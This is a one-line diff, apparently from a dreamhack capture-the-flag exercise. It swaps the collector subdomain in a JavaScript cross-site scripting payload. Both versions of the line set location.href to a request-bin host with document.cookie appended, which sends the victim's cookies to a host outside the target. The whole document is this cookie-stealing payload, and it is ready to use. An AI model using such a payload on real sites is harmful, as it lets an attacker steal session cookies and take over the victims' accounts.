@@ -1,1 +1,1 @@
-location.href = "https://mmulpym.request.dreamhack.games?" + document.cookie
+location.href = "https://nqcnacn.request.dreamhack.games?" + document.cookie
